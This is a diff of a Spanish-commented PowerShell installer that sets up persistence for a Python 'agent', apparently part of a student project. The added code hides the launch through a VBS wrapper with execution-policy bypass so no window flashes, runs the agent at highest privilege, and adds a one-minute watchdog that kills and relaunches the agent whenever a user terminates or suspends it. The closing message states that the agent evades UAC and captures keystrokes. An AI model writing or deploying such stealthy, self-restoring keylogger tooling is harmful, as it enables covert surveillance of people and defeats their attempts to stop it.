@@ -73,22 +73,55 @@ if (Test-Path "requirements.txt") {
 # 5. Configurar persistencia (Equivalente a Systemd + Sudoers)
 Write-Host "[*] Configurando persistencia (Programador de Tareas)..." -ForegroundColor Cyan
 
-$TaskName = "Agente_IntegriTI_$UsuarioReal"
+$TaskName = "Agente_ProyectoTitulo_$UsuarioReal"
 $ScriptPython = "$DirActual\Client\client.py"
 # Usamos pythonw.exe para que no se abra ninguna ventana negra (silencioso)
 $PythonVenv = "$DirActual\venv\Scripts\pythonw.exe"
 
-# A) Definir la acción (Ejecutar el agente)
-$Action = New-ScheduledTaskAction -Execute $PythonVenv -Argument "`"$ScriptPython`"" -WorkingDirectory "$DirActual\Client"
+# A) Definir la acción: NO lanzamos pythonw.exe client.py directamente.
+#    Lanzamos el script "vigilante", que primero revisa si ya hay una
+#    instancia viva Y sana (y si está SUSPENDIDA externamente la mata),
+#    y solo arranca una nueva cuando hace falta. Así la misma acción
+#    sirve tanto para el arranque en el logon como para cada tick del
+#    watchdog, y cubre tanto "el proceso murió" como "el proceso lo
+#    congelaron" (ver watchdog.ps1 para el detalle de por qué
+#    esto no se puede resolver solo con MultipleInstances=IgnoreNew).
+#
+#    OJO: no llamamos a powershell.exe directamente desde la tarea
+#    programada. Aunque se le pase -WindowStyle Hidden, Windows crea
+#    primero la ventana de consola de powershell.exe y recién después la
+#    oculta — ese hueco entre "crear" y "ocultar" es justo la pestaña que
+#    aparece y desaparece. Por eso envolvemos la llamada en un .vbs:
+#    WScript.Shell.Run con el tercer parámetro en 0 (ventana oculta) lanza
+#    el proceso sin pasar nunca por ese estado intermedio visible, porque
+#    wscript.exe no crea consola propia para empezar.
+$VigilanteScript = Join-Path $PSScriptRoot "watchdog.ps1"
+$ComandoPowershell = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$VigilanteScript`" -PythonExe `"$PythonVenv`" -ScriptPath `"$ScriptPython`" -WorkDir `"$DirActual\Client`""
+
+# En VBScript, las comillas dobles dentro de un literal de cadena se escapan
+# duplicándolas (""), así que hay que duplicar las que ya tiene $ComandoPowershell
+# antes de insertarlo dentro del string que WScript.Shell.Run va a ejecutar.
+$ComandoVbsEscapado = $ComandoPowershell.Replace('"', '""')
+$ContenidoVbs = 'Set objShell = CreateObject("WScript.Shell")' + "`r`n" +
+    'objShell.Run "' + $ComandoVbsEscapado + '", 0, False' + "`r`n"
+
+$VbsLanzador = Join-Path $PSScriptRoot "lanzar_vigilante_oculto.vbs"
+# Unicode (UTF-16LE con BOM) para que wscript.exe lea bien la ruta aunque
+# el nombre de usuario de Windows tenga tildes o ñ.
+Set-Content -Path $VbsLanzador -Value $ContenidoVbs -Encoding Unicode -Force
+
+$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsLanzador`""
 
 # B) Definir los gatillos:
 #    B1) Al iniciar sesión este usuario (arranque normal)
 $TriggerLogon = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal
 
-#    B2) Watchdog: reintenta cada 1 minuto, indefinidamente. Si el proceso ya
-#        está corriendo, MultipleInstances=IgnoreNew hace que este disparo no
-#        haga nada; si el proceso fue matado (ej. Task Manager), lo relanza
-#        en el siguiente minuto sin intervención humana.
+#    B2) Watchdog: corre el vigilante cada 1 minuto, indefinidamente. Si el
+#        agente está corriendo normal, el vigilante no hace nada; si está
+#        suspendido (congelado desde afuera, p.ej. con Process Hacker) lo
+#        mata y relanza uno limpio; si directamente lo mataron (Task
+#        Manager), lo relanza. Todo en el siguiente tick, sin intervención
+#        humana.
 $TriggerWatchdog = New-ScheduledTaskTrigger -Once -At (Get-Date) `
     -RepetitionInterval (New-TimeSpan -Minutes 1) `
     -RepetitionDuration (New-TimeSpan -Days 3650)
@@ -97,8 +130,7 @@ $TriggerWatchdog = New-ScheduledTaskTrigger -Once -At (Get-Date) `
 $Principal = New-ScheduledTaskPrincipal -UserId $UsuarioReal -LogonType Interactive -RunLevel Highest
 
 # D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla,
-#    y NO permitir una segunda instancia en paralelo cuando el watchdog dispara mientras
-#    el agente ya está vivo)
+#    y NO permitir que dos ticks del vigilante corran en paralelo si se superponen)
 $Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
     -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
 
@@ -116,5 +148,5 @@ Write-Host "[OK] Instalacion completada. Agente corriendo en segundo plano." -Fo
 Write-Host "=================================================="
 Write-Host " INSTALACION COMPLETADA CON EXITO."
 Write-Host " El agente evadira el UAC, capturara teclas en Windows,"
-Write-Host " y se reiniciara solo si el proceso es terminado manualmente."
+Write-Host " y se reiniciara solo si el proceso es terminado o SUSPENDIDO manualmente."
 Write-Host "=================================================="
